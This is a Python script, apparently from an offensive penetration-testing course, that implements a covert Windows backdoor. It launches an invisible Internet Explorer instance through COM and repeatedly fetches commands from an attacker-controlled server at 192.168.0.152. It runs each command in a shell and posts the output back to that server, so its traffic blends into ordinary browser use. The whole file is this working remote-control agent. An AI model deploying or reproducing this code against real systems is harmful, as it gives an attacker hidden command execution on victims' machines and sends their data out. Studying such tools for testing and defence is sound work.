# Python For Offensive PenTest: A Complete Practical Course  - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2

from win32com.client import Dispatch
from time import sleep
import subprocess

ie = Dispatch("InternetExplorer.Application") # Create browser instance.
ie.Visible = 0 # Make it invisible [ run in background ] (1= invisible)

# Paramaeters for POST
dURL = "http://192.168.0.152"
Flags = 0
TargetFrame = 0


while True:
    ie.Navigate("http://192.168.0.152") # Navigate to our kali web server to grab the hacker commands
    while ie.ReadyState != 4: # Wait for browser to finish loading.
        sleep(1)

    command = ie.Document.body.innerHTML 
    command = command.encode() # encode the command
    if 'terminate' in command.decode():
        ie.Quit() # quit the IE and end up the process
        break
    else:
        CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        Data = CMD.stdout.read()
        PostData = memoryview( Data ) # in order to submit or post data using COM technique , it requires to  buffer the data first using memoryview
        ie.Navigate(dURL, Flags, TargetFrame, PostData) # we post the comamnd execution result along with the post parameters which we defined eariler..

    sleep(3)
